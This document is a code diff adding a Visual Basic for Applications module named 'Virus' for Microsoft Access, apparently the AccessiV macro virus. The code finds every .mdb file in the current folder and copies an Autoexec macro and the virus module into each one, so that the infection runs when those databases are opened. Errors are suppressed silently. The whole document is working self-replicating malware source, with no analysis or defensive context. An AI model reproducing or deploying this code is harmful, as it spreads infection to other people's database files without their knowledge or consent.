@@ -1,0 +1,28 @@
+   Attribute VB_Name = "Virus"
+   Dim filename As String
+   Option Compare Database
+   Option Explicit
+
+   Public Sub findfirst()
+   filename = Dir("*.mdb", vbNormal)   'Find MS Database File!
+   End Sub
+
+   Public Sub infect()
+   On Error GoTo ohcrap
+   DoCmd.TransferDatabase acExport, "Microsoft Access", filename, acMacro, "Autoexec", "Autoexec"
+   DoCmd.TransferDatabase acExport, "Microsoft Access", filename, acModule, "Virus", "Virus"
+   ohcrap:
+   End Sub
+
+   Public Function AccessiV()
+   Call findfirst
+   Call infect
+   While filename <> ""
+   Call findnext
+   Call infect
+   Wend
+   End Function
+
+   Public Sub findnext()
+   filename = Dir                      'Find another MS Database File!
+   End Sub
